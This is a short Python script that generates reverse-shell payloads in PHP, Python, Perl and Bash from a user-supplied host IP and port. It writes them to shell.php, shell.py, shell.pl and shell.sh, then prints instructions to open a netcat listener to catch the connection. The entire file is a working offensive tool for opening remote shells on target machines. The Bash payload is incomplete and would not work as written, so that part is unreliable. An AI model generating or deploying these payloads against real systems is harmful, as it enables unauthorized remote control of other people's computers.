import os
ip = input("\nEnter the Host IP\t")
port = input("\nEnter the Listener Port\t")
print("\n\nSlect the type of reverse that you need to generate")
print("\n1.PHP\n2.Python\n3.Perl\n4.Bash")
shell = input("\nEnter choice\t")

if(shell == "1"):
    p1 = """$sock=fsockopen("""
    p2 = """);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"""
    cmd = "<?php\n" + p1 + '"' + ip + '"' + ',' + port + p2 + "\n?>"
    f = open("shell.php", "w")
    f.write(cmd)
    f.close()
    print("Reverse shell generated @ ")
    print(os.getcwd())
if(shell == "2"):
    cmd = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""" + '"' + ip + '",' + \
        port + \
        """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")"""
    f = open("shell.py", "w")
    f.write(cmd)
    f.close()
    print("Reverse Shell generated @ ")
    print(os.getcwd())
if(shell == "3"):
	cmd = """use Socket;$i=+""" + '"' + ip + '"' + """;$p=""" + port + \
	    """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};"""
	f = open("shell.pl", "w")
	f.write(cmd)
	f.close()
	print("Reverse Shell generated @ ")
	print(os.getcwd())
if(shell=="4"):
	cmd=">& /dev/tcp/"+ip+"/"+port+" 0>&1"
	f=open("shell.sh","w")
	f.write(cmd)
	f.close()
	print("Reverse Shell generated @ ")
	print(os.getcwd())
print("\n\nINSTRUCTIONS!!!")
print("Open a new terminal tab/window and enter the following command before executing the payload.")
print("nc -nlvp "+port)
    
